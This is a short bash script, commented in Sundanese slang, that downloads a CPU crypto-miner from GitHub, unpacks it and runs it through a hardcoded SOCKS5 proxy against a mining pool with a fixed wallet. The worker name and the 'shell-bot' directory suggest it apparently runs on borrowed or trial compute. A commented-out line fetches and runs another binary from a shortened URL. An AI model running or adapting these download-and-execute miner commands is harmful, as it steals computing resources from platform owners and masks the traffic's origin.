#!/bin/bash

# edit sc dibawah se suai slera!
# kumaha aink we njink

cd /home/shell-bot
#wget -qO ngaceng https://git.io/J161r && chmod +x ngaceng && ./ngaceng -v -l verushash.mine.zergpool.com:3300 -u DTsu49wXhGQ7yGWuRYsnz4EmC55Xg6YkrE.hotaru -p c=DGB,mc=VRSC
export http_proxy=socks5://72.221.172.203:4145
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && cd hellminer && chmod u+x ./hellminer && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RHTc3sa8bhr6qXb9hsVE98JCMZUVp5JQMo.dataiku2-edu3 -p x --cpu 3

